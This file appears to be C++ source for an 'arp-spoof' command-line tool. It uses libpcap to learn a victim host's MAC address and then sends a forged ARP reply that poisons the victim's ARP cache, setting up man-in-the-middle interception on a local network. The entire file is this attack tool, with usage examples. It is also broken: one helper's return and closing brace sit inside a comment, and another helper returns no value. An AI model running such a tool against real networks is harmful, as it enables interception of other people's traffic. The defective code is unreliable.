#include <iostream>
#include <vector>
#include <string>
#include <stdexcept>
#include <pcap.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    std::cerr << "syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip2>...]\n";
    std::cerr << "sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n";
}

std::string get_mac_address(const std::string& iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        throw std::runtime_error("소켓 생성에 실패하였습니다.");
    }

    struct ifreq ifr;
    std::memset(&ifr, 0, sizeof(ifr));
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        close(fd);
        throw std::runtime_error("IOCTL request failed");
    }

    close(fd);

  /*char mac_str[18];
    std::snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                  (unsigned char)ifr.ifr_hwaddr.sa_data[0],
                  (unsigned char)ifr.ifr_hwaddr.sa_data[1],
                  (unsigned char)ifr.ifr_hwaddr.sa_data[2],
                  (unsigned char)ifr.ifr_hwaddr.sa_data[3],
                  (unsigned char)ifr.ifr_hwaddr.sa_data[4],
                  (unsigned char)ifr.ifr_hwaddr.sa_data[5]);

    return std::string(mac_str);
} */

std::string get_ip_address(const std::string& iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        throw std::runtime_error("Socket creation failed");
    }

    struct ifreq ifr;
    std::memset(&ifr, 0, sizeof(ifr));
    ifr.ifr_addr.sa_family = AF_INET;
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        close(fd);
        throw std::runtime_error("IOCTL request failed");
    }

    close(fd);

}

void send_arp_request(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, const Ip& target_ip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(target_ip);

    if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) != 0) {
        throw std::runtime_error("Error sending ARP request: " + std::string(pcap_geterr(handle)));
    }
}

Mac get_mac_from_reply(pcap_t* handle, const Ip& sender_ip) {
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        int res = pcap_next_ex(handle, &header, &recv_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            throw std::runtime_error("Error capturing packet: " + std::string(pcap_geterr(handle)));
        }

        EthArpPacket* recv_etharp = (EthArpPacket*)recv_packet;
        if (recv_etharp->eth_.type_ == htons(EthHdr::Arp) && recv_etharp->arp_.op_ == htons(ArpHdr::Reply)) {
            if (recv_etharp->arp_.sip() == sender_ip) {
                return recv_etharp->eth_.smac();
            }
        }
    }
}

void send_arp_reply(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, const Mac& target_mac, const Ip& sender_ip, const Ip& target_ip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = target_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = target_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) != 0) {
        throw std::runtime_error("Error sending ARP reply: " + std::string(pcap_geterr(handle)));
    }
}

int main(int argc, char* argv[]) {
    try {
        if (argc < 4 || (argc % 2) != 0) {
            usage();
            return EXIT_FAILURE;
        }

        std::string dev = argv[1];
        std::vector<Ip> sender_ips;
        std::vector<Ip> target_ips;

        for (int i = 2; i < argc; i += 2) {
            sender_ips.emplace_back(argv[i]);
            target_ips.emplace_back(argv[i + 1]);
        }

        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);
        if (handle == nullptr) {
            throw std::runtime_error("Couldn't open device " + dev + " (" + errbuf + ")");
        }

        std::string my_mac_str = get_mac_address(dev);
        std::string my_ip_str = get_ip_address(dev);

        Mac my_mac(my_mac_str.c_str());
        Ip my_ip(my_ip_str.c_str());

        for (size_t i = 0; i < sender_ips.size(); ++i) {
            send_arp_request(handle, my_mac, my_ip, sender_ips[i]);
            Mac sender_mac = get_mac_from_reply(handle, sender_ips[i]);

            send_arp_reply(handle, my_mac, my_ip, sender_mac, sender_ips[i], target_ips[i]);
        }

        pcap_close(handle);
    } catch (const std::exception& ex) {
        std::cerr << "Error: " << ex.what() << std::endl;
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
